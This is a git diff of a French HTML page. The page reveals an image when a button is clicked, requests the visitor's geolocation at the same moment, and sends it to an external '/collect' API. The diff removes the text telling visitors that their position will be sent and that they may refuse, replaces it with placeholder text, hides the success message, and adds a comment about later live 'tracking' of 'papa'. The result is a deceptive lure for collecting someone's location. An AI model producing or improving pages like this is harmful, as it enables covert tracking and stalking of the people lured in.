@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Voir l’image & partager la position</title>
+  <title>Bouton GEO api prompt</title>
   <style>
     :root { color-scheme: light dark; }
     body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; }
@@ -12,11 +12,11 @@
     .img { display:block; width:100%; height:auto; aspect-ratio: 16/9; object-fit:cover; }
     .overlay {
       position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center;
-      background: rgba(0,0,0,.55); color:#fff; gap:12px; padding:20px; text-align:center;
+      background: rgba(0,0,0,.0); color:#FDCFFA; gap:12px; padding:20px; text-align:center;
     }
-    .btn { border:0; padding:12px 18px; border-radius:12px; font-weight:700; cursor:pointer; background:#0ea5a4; color:#fff; }
+    .btn { border:0; padding:12px 18px; border-radius:12px; font-weight:700; cursor:pointer; background:#9B5DE0; color:#4E56C0; }
     .muted { opacity:.85; font-size:.95rem; }
-    .toast { position:fixed; bottom:16px; left:50%; transform:translateX(-50%); background:#111; color:#fff; padding:10px 14px; border-radius:8px; font-size:.9rem; display:none; }
+    .toast { position:fixed; bottom:16px; left:50%; transform:translateX(-50%); background:#4E56C0; color:#D78FEE; padding:10px 14px; border-radius:8px; font-size:.9rem; display:none; }
   </style>
 </head>
 <body>
@@ -25,14 +25,14 @@
       <img id="heroImg" class="img" alt="Image" />
       <figcaption class="overlay" id="overlay">
         <div>
-          <h2 style="margin:0 0 6px">Voir l’image</h2>
+          <h2 style="margin:0 0 6px">Voir l’image(#à enlevez plus tard)</h2>
           <p class="muted" style="margin:0 0 14px">
-            En cliquant, le navigateur demandera l’accès à ta position.
-            Si tu acceptes, nous l’enverrons <strong>une seule fois</strong> à notre serveur.
+            plein d'object a retirer plus tard.
+            Test Text <strong>Highlighted Test Text</strong> Test Text.
           </p>
           <button id="allowBtn" class="btn">Voir l’image & partager ma position</button>
           <p class="muted" style="margin:10px 0 0">
-            Tu peux refuser — l’image s’affichera quand même.
+            Test Text .
           </p>
         </div>
       </figcaption>
@@ -46,7 +46,7 @@
     const IMAGE_URL = "https://images.unsplash.com/photo-1520975922284-8b456906c813?w=1600&q=80"; // change-la si tu veux
     const API_BASE  = "https://project-localisation-api-rk8i.onrender.com";
     const ENDPOINT  = API_BASE + "/collect";
-    const AUTH_HEADER = null; // ex. "Bearer XXX" si tu protèges l’API
+    const AUTH_HEADER = null; // ex. "Bearer XXX" 
 
     const heroImg  = document.getElementById('heroImg');
     const overlay  = document.getElementById('overlay');
@@ -73,10 +73,10 @@
           mode: "cors"
         });
         if (!res.ok) throw new Error("HTTP " + res.status);
-        showToast("Position envoyée ✅", true);
+        showToast("✅", true);
       } catch (e) {
         console.error(e);
-        showToast("Échec de l’envoi ❌", false);
+        showToast("Erreur(#variable ligne 79) ❌", false);
       }
     }
 
@@ -110,9 +110,10 @@
 
     allowBtn.addEventListener('click', () => {
       overlay.style.display = "none";    // révèle l’image
-      requestOnce();                     // demande de position suite au geste utilisateur
+      requestOnce();                     // à changer plus tard si besoin de en direct pour le tracking si papa 
     });
   </script>
 </body>
 </html>
+
 
